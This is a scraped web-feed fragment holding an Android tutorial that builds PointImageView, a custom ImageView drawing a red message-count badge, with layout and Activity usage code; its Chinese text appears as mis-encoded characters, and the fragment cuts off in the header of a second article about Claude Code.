                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å…ˆä¸Šæ•ˆæœå›¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68941384027742f89e2892dfb7e0c6d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWl6ZmM6ZmM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444575&amp;x-signature=6Id782wy2aYDGdnISqxCccFsnlA%3D" alt="image.png" loading="lazy"/></p>
<p>è‡ªå®šä¹‰view</p>
<pre><code class="hljs"/></pre>
<pre><code class="hljs language-arduino" lang="arduino">

<span class="hljs-comment">/**
 * Description : javaç±»ä½œç”¨æè¿°
 *

 * @since : 2026/1/7
 */</span>


<span class="hljs-keyword">import</span> android.annotation.SuppressLint;
<span class="hljs-keyword">import</span> android.content.Context;
<span class="hljs-keyword">import</span> android.graphics.Canvas;
<span class="hljs-keyword">import</span> android.graphics.Paint;
<span class="hljs-keyword">import</span> android.graphics.Paint.FontMetrics;
<span class="hljs-keyword">import</span> android.text.TextPaint;
<span class="hljs-keyword">import</span> android.util.AttributeSet;
<span class="hljs-keyword">import</span> android.util.TypedValue;
<span class="hljs-keyword">import</span> android.widget.ImageView;

<span class="hljs-comment">/**
 * å®ç°åœ¨å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ¶ˆæ¯æ¡æ•°ï¼ˆæ— éœ€è®¾ç½®paddingï¼‰
 */</span>
@<span class="hljs-built_in">SuppressLint</span>(<span class="hljs-string">"AppCompatCustomView"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PointImageView</span> extends ImageView {

    <span class="hljs-comment">/**
     * é»˜è®¤æ¨¡å¼
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pointMode = NUMBER_POINT;

    <span class="hljs-comment">// 1.ä¸æ˜¾ç¤ºçº¢ç‚¹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> NO_POINT = <span class="hljs-number">1</span>;
    <span class="hljs-comment">// 2.åªæ˜¾ç¤ºä¸€ä¸ªçº¢ç‚¹,è¡¨ç¤ºæœ‰æ–°æ¶ˆæ¯</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> ONLY_POINT = <span class="hljs-number">2</span>;
    <span class="hljs-comment">// 3.æ˜¾ç¤ºä¸€ä¸ªçº¢ç‚¹,çº¢ç‚¹ä¸­é—´è¿˜æœ‰æ¶ˆæ¯çš„æ•°é‡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> NUMBER_POINT = <span class="hljs-number">3</span>;

    <span class="hljs-comment">// æ¶ˆæ¯çš„æ•°é‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> number = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// è®°å½•å½“å‰æ˜¯å¦æœ‰æ–°æ¶ˆæ¯ï¼ˆè‡ªåŠ¨æ ¹æ®numberåˆ¤å®šï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isHaveMessage = <span class="hljs-literal">false</span>;

    <span class="hljs-comment">/**
     * ç”»åœ†çš„ç”»ç¬”
     */</span>
    <span class="hljs-keyword">private</span> Paint paint;

    <span class="hljs-comment">/**
     * ç”»æ¶ˆæ¯æ¡æ•°çš„ç”»ç¬”
     */</span>
    <span class="hljs-keyword">private</span> TextPaint paintText;

    <span class="hljs-comment">// è§’æ ‡åŠå¾„ï¼ˆå›ºå®š15dpï¼Œæ— éœ€ä¾èµ–paddingï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> badgeRadius;
    <span class="hljs-comment">// æ–‡å­—å¤§å°ï¼ˆå›ºå®š12spï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> textSize;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PointImageView</span><span class="hljs-params">(Context context)</span> </span>{
        <span class="hljs-built_in">super</span>(context);
        <span class="hljs-built_in">init</span>(context);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PointImageView</span><span class="hljs-params">(Context context, AttributeSet attrs)</span> </span>{
        <span class="hljs-built_in">super</span>(context, attrs);
        <span class="hljs-built_in">init</span>(context);
    }

    <span class="hljs-comment">/**
     * åˆå§‹åŒ–æ•°æ®ï¼ˆé€‚é…dp/spï¼Œç§»é™¤paddingä¾èµ–ï¼‰
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Context context)</span> </span>{
        <span class="hljs-comment">// è½¬æ¢å°ºå¯¸ï¼šdpè½¬pxã€spè½¬pxï¼ˆé€‚é…ä¸åŒè®¾å¤‡ï¼‰</span>
        badgeRadius = <span class="hljs-built_in">dp2px</span>(context, <span class="hljs-number">30</span>); <span class="hljs-comment">// è§’æ ‡åŠå¾„15dpï¼ˆæ ¸å¿ƒï¼šå›ºå®šå¤§å°ï¼Œä¸ä¾èµ–paddingï¼‰</span>
        textSize = <span class="hljs-built_in">sp2px</span>(context, <span class="hljs-number">30</span>);    <span class="hljs-comment">// æ–‡å­—å¤§å°12sp</span>

        <span class="hljs-comment">// åˆå§‹åŒ–çº¢ç‚¹ç”»ç¬”</span>
        paint = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Paint</span>();
        paint.<span class="hljs-built_in">setStyle</span>(Paint.Style.FILL); <span class="hljs-comment">// å®å¿ƒ</span>
        paint.<span class="hljs-built_in">setColor</span>(<span class="hljs-number">0xffff0000</span>);       <span class="hljs-comment">// çº¢è‰²</span>
        paint.<span class="hljs-built_in">setAntiAlias</span>(<span class="hljs-literal">true</span>);         <span class="hljs-comment">// æŠ—é”¯é½¿</span>

        <span class="hljs-comment">// åˆå§‹åŒ–æ–‡å­—ç”»ç¬”</span>
        paintText = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TextPaint</span>();
        paintText.<span class="hljs-built_in">setColor</span>(<span class="hljs-number">0xffffffff</span>);   <span class="hljs-comment">// ç™½è‰²</span>
        paintText.<span class="hljs-built_in">setTextSize</span>(textSize);  <span class="hljs-comment">// è®¾ç½®æ–‡å­—å¤§å°</span>
        paintText.<span class="hljs-built_in">setAntiAlias</span>(<span class="hljs-literal">true</span>);
        paintText.<span class="hljs-built_in">setTextAlign</span>(Paint.Align.CENTER); <span class="hljs-comment">// æ–‡å­—æ°´å¹³å±…ä¸­ï¼ˆç®€åŒ–è®¡ç®—ï¼‰</span>
    }

    @<span class="hljs-function">Override
    <span class="hljs-keyword">protected</span> <span class="hljs-type">void</span> <span class="hljs-title">onDraw</span><span class="hljs-params">(Canvas canvas)</span> </span>{
        super.<span class="hljs-built_in">onDraw</span>(canvas);
        <span class="hljs-comment">// æ— æ¶ˆæ¯åˆ™ä¸ç»˜åˆ¶</span>
        <span class="hljs-keyword">if</span> (!isHaveMessage) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// è®¡ç®—è§’æ ‡ä¸­å¿ƒåæ ‡ï¼šViewå³ä¸Šè§’å‘å†…åç§»radiusï¼ˆé¿å…è¶…å‡ºViewï¼‰</span>
        <span class="hljs-type">float</span> badgeCenterX = <span class="hljs-built_in">getWidth</span>() - badgeRadius;  <span class="hljs-comment">// å³è¾¹ç¼˜ - åŠå¾„</span>
        <span class="hljs-type">float</span> badgeCenterY = badgeRadius;               <span class="hljs-comment">// ä¸Šè¾¹ç¼˜ + åŠå¾„</span>

        <span class="hljs-keyword">switch</span> (pointMode) {
            <span class="hljs-keyword">case</span> NO_POINT: <span class="hljs-comment">// ä¸æ˜¾ç¤ºçº¢ç‚¹</span>
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> ONLY_POINT: <span class="hljs-comment">// åªæ˜¾ç¤ºçº¢ç‚¹</span>
                canvas.<span class="hljs-built_in">drawCircle</span>(badgeCenterX, badgeCenterY, badgeRadius, paint);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NUMBER_POINT: <span class="hljs-comment">// æ˜¾ç¤ºçº¢ç‚¹ä¸”å¸¦æ¶ˆæ¯æ¡æ•°</span>
                <span class="hljs-comment">// 1. ç»˜åˆ¶çº¢è‰²åœ†ç‚¹</span>
                canvas.<span class="hljs-built_in">drawCircle</span>(badgeCenterX, badgeCenterY, badgeRadius, paint);
                <span class="hljs-comment">// 2. å¤„ç†æ˜¾ç¤ºçš„æ–‡å­—</span>
                <span class="hljs-type">String</span> showText;
                <span class="hljs-keyword">if</span> (number &gt; <span class="hljs-number">0</span> &amp;&amp; number &lt; <span class="hljs-number">100</span>) {
                    showText = <span class="hljs-type">String</span>.<span class="hljs-built_in">valueOf</span>(number);
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &gt;= <span class="hljs-number">100</span>) {
                    showText = <span class="hljs-string">"99+"</span>; <span class="hljs-comment">// ä¼˜åŒ–æ˜¾ç¤ºï¼š99+ æ›´ç¬¦åˆé€šç”¨è®¾è®¡</span>
                } <span class="hljs-keyword">else</span> {
                    showText = <span class="hljs-string">""</span>;
                }
                <span class="hljs-comment">// 3. è®¡ç®—æ–‡å­—å‚ç›´å±…ä¸­çš„åŸºå‡†çº¿ï¼ˆæ ¸å¿ƒï¼šé¿å…æ–‡å­—åç§»ï¼‰</span>
                FontMetrics fm = paintText.<span class="hljs-built_in">getFontMetrics</span>();
                <span class="hljs-comment">// å‚ç›´å±…ä¸­å…¬å¼ï¼šä¸­å¿ƒYåæ ‡ - (å­—ä½“ä¸Šè¾¹ç•Œ+ä¸‹è¾¹ç•Œ)/2</span>
                <span class="hljs-type">float</span> textBaseline = badgeCenterY - (fm.top + fm.bottom) / <span class="hljs-number">2</span>;
                <span class="hljs-comment">// 4. ç»˜åˆ¶æ–‡å­—ï¼ˆæ°´å¹³å±…ä¸­+å‚ç›´å±…ä¸­ï¼‰</span>
                canvas.<span class="hljs-built_in">drawText</span>(showText, badgeCenterX, textBaseline, paintText);
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-comment">/**
     * è®¾ç½®æ¶ˆæ¯æ¡æ•°ï¼ˆè‡ªåŠ¨åˆ¤å®šæ˜¯å¦æœ‰æ¶ˆæ¯ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒç”¨setHaveMessageï¼‰
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setMessageNum</span><span class="hljs-params">(<span class="hljs-type">int</span> number)</span> </span>{
        <span class="hljs-keyword">this</span>.number = number;
        <span class="hljs-comment">// è‡ªåŠ¨æ›´æ–°ï¼šæ•°å­—&gt;0åˆ™æ˜¾ç¤ºçº¢ç‚¹/æ•°å­—ï¼Œå¦åˆ™ä¸æ˜¾ç¤º</span>
        <span class="hljs-keyword">this</span>.isHaveMessage = number &gt; <span class="hljs-number">0</span>;
        <span class="hljs-built_in">invalidate</span>(); <span class="hljs-comment">// è§¦å‘é‡ç»˜</span>
    }

    <span class="hljs-comment">/**
     * æ‰‹åŠ¨æ§åˆ¶æ˜¯å¦æ˜¾ç¤ºï¼ˆå¯é€‰ï¼Œä¼˜å…ˆç”¨setMessageNumè‡ªåŠ¨æ§åˆ¶ï¼‰
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setHaveMessage</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isHaveMessage)</span> </span>{
        <span class="hljs-keyword">this</span>.isHaveMessage = isHaveMessage;
        <span class="hljs-built_in">invalidate</span>();
    }

    <span class="hljs-comment">/**
     * è®¾ç½®æ˜¾ç¤ºæ¨¡å¼
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setPointMode</span><span class="hljs-params">(<span class="hljs-type">int</span> mode)</span> </span>{
        <span class="hljs-keyword">if</span> (mode &gt; <span class="hljs-number">0</span> &amp;&amp; mode &lt;= <span class="hljs-number">3</span>) {
            pointMode = mode;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">"è®¾ç½®çš„æ¨¡å¼æœ‰è¯¯ï¼Œä»…æ”¯æŒ1-3"</span>);
        }
        <span class="hljs-built_in">invalidate</span>(); <span class="hljs-comment">// æ¨¡å¼å˜åŒ–åé‡ç»˜</span>
    }

    <span class="hljs-comment">// å·¥å…·æ–¹æ³•ï¼šdpè½¬px</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-title">dp2px</span><span class="hljs-params">(Context context, <span class="hljs-type">float</span> dp)</span> </span>{
        <span class="hljs-keyword">return</span> TypedValue.<span class="hljs-built_in">applyDimension</span>(
                TypedValue.COMPLEX_UNIT_DIP,
                dp,
                context.<span class="hljs-built_in">getResources</span>().<span class="hljs-built_in">getDisplayMetrics</span>()
        );
    }

    <span class="hljs-comment">// å·¥å…·æ–¹æ³•ï¼šspè½¬px</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-title">sp2px</span><span class="hljs-params">(Context context, <span class="hljs-type">float</span> sp)</span> </span>{
        <span class="hljs-keyword">return</span> TypedValue.<span class="hljs-built_in">applyDimension</span>(
                TypedValue.COMPLEX_UNIT_SP,
                sp,
                context.<span class="hljs-built_in">getResources</span>().<span class="hljs-built_in">getDisplayMetrics</span>()
        );
    }

    <span class="hljs-comment">// å…¼å®¹æ—§æ–¹æ³•åï¼ˆé¿å…è°ƒç”¨æ–¹æŠ¥é”™ï¼‰</span>
    @<span class="hljs-function">Deprecated
    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setHaveMesage</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isHaveMesage)</span> </span>{
        <span class="hljs-built_in">setHaveMessage</span>(isHaveMesage);
    }
}
</code></pre>
<p>ä½¿ç”¨</p>
<pre><code class="hljs language-ini" lang="ini">
&lt;?xml <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;
&lt;LinearLayout xmlns:<span class="hljs-attr">android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    xmlns:<span class="hljs-attr">tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span>
    android:<span class="hljs-attr">layout_width</span>=<span class="hljs-string">"match_parent"</span>
    android:<span class="hljs-attr">layout_height</span>=<span class="hljs-string">"match_parent"</span>
    android:<span class="hljs-attr">gravity</span>=<span class="hljs-string">"center"</span>
    android:<span class="hljs-attr">orientation</span>=<span class="hljs-string">"vertical"</span>&gt;

    &lt;com.amap.apis.cluster.testview.PointImageView
        android:<span class="hljs-attr">layout_width</span>=<span class="hljs-string">"100dp"</span>
        android:<span class="hljs-attr">layout_height</span>=<span class="hljs-string">"100dp"</span>
        android:<span class="hljs-attr">src</span>=<span class="hljs-string">"@drawable/test"</span>
        android:<span class="hljs-attr">id</span>=<span class="hljs-string">"@+id/imageView"</span> /&gt;

&lt;/LinearLayout&gt;
</code></pre>
<p>åœ¨Activity ä¸­åŠ è½½</p>
<pre><code class="hljs language-scss" lang="scss">
private PointImageView mPointImageView;
<span class="hljs-keyword">@Override</span>
protected void onCreate(Bundle savedInstanceState) {
    super<span class="hljs-selector-class">.onCreate</span>(savedInstanceState);
    <span class="hljs-built_in">setContentView</span>(R.layout.activity_customer_view_main);
    mPointImageView = <span class="hljs-built_in">findViewById</span>(R.id.imageView);
    mPointImageView<span class="hljs-selector-class">.setImageResource</span>(R.drawable.test);
    mPointImageView<span class="hljs-selector-class">.setMessageNum</span>(<span class="hljs-number">10</span>);
    mPointImageView<span class="hljs-selector-class">.setPointMode</span>(<span class="hljs-number">3</span>);

    int sizeDp = <span class="hljs-number">200</span>;
    int sizePx = <span class="hljs-built_in">dp2px</span>(sizeDp); <span class="hljs-comment">// dp è½¬ px</span>
    ViewGroup<span class="hljs-selector-class">.LayoutParams</span> params = new LinearLayout<span class="hljs-selector-class">.LayoutParams</span>(sizePx, sizePx);
    mPointImageView<span class="hljs-selector-class">.setLayoutParams</span>(params);
    mPointImageView<span class="hljs-selector-class">.setPadding</span>(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>);

}
private int <span class="hljs-built_in">dp2px</span>(float dp) {
    <span class="hljs-attribute">float</span> density = <span class="hljs-built_in">getResources</span>()<span class="hljs-selector-class">.getDisplayMetrics</span>()<span class="hljs-selector-class">.density</span>;
    return (int) (dp * density + <span class="hljs-number">0.5</span>f);
}


</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦æ­ç§˜ï¼šä¸ºä»€ä¹ˆé¡¶å°–å¼€å‘è€…éƒ½å¼€å§‹åœ¨ç»ˆç«¯ç”¨ Claude Code å†™ä»£ç ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592759902675779630</link>    <guid>https://juejin.cn/post/7592759902675779630</guid>    <pubDate>2026-01-08T02:35:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759902675779630" data-draft-id="7592552501579251738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦æ­ç§˜ï¼šä¸ºä»€ä¹ˆé¡¶å°–å¼€å‘è€…éƒ½å¼€å§‹åœ¨ç»ˆç«¯ç”¨ Claude Code å†™ä»£ç ï¼Ÿ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T02:35:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿé¸£"/> <meta itemprop="url" content="https://juejin.cn/user/4107431171852270"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦æ­ç§˜ï¼šä¸ºä»€ä¹ˆé¡¶å°–å¼€å‘è€…éƒ½å¼€å§‹åœ¨ç»ˆç«¯ç”¨ Claude Code å†™ä»£ç ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431171852270/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿé¸£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:35:29.000Z" title="Thu Jan 08 2026 02:35:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 